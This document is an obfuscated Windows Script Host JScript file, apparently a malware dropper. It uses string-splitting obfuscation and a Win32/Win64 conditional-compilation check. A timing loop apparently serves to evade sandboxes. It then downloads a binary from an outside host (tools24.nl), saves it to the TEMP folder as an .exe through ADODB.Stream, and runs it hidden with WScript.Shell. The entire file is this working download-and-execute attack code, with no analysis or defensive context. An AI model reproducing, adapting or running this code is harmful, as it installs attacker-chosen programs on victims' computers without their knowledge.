var P1 = false;
var CG = "Create"+"Object";
var EG = function SX() {return WScript[CG]("WScript"+".Shell");}(), RS = 11;
var NT = "MSXML2"+".XMLHTTP";
var V = 2;
var SS = V - 2;
function G(OU){EG["Run"](OU, SS, SS);};
function EM(){return NT + "";};
function U(RA, F2){SS = SS * 1; return RA - F2;};
function P(){return CG;};
/*@cc_on
  @if (@_win32 || @_win64)
    P1 = true;
  @end
@*/
if (P1)
{
var HE = "";
function I(){return 22;};
var IF = 0; var P0 = 0;
function H()
{
var F0 = new this["Date"]();
var F = F0["getUTCMilliseconds"]();
WScript["Sleep"](I());
var F0 = new this["Date"]();
var EY = F0["getUTCMilliseconds"]();
WScript["Sleep"](I());
var F0 = new this["Date"]();
var Y = F0["getUTCMilliseconds"]();
var IF = "IP";
IF = U(EY, F);
var P0 = "WL";
P0 = U(Y, EY);
HE = "open";
return U(IF, P0);
}
var WZ = false;
var F1 = false;
for (var BY = SS; BY < I() * 1; BY++){if (H() != SS){
WZ = true; 
P0 = "31" + 11 * IF + P0; 
F1 = true; 
break;
}}
function WP() {return ((WZ == true) && (WZ == F1)) ? 1 : SS;};
if (WZ && WP() && F1){
function B() {return EG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "V3Wa3EjDoVXz7aSF.ex" + "e";};
 GB = EM();
 ME = WScript[CG](GB);
 var JI = 1;
do { 
	for (;JI;){
	try {
		if (JI == 1)
		{
			ME[HE]("GET", "http://tools24.nl/w8isa", false);
			ME["send"]();
			DM = "Sleep";
			JI = 2;
		}
		WScript[DM](I() + 120); 
		if (ME["readystate"] < 2 * 2) continue;
		JI = SS;
		function S(UQ) {var XE = (1, 2, 3, 4, 5, UQ); return XE;};
		NY = WScript[P()]("ADODB.Stream");
		GB = NY;
		GB[HE]();
		GB["type"] = S(1);
		GB["write"](ME["ResponseBody"]);
		NY["position"] = S(SS);
		GB["Save" + "ToFile"](B(), 2);
		NY["cl"+"ose"]();
		GS = B();
		G(GS);
	} catch(U0){};};
}while (JI);
}
}

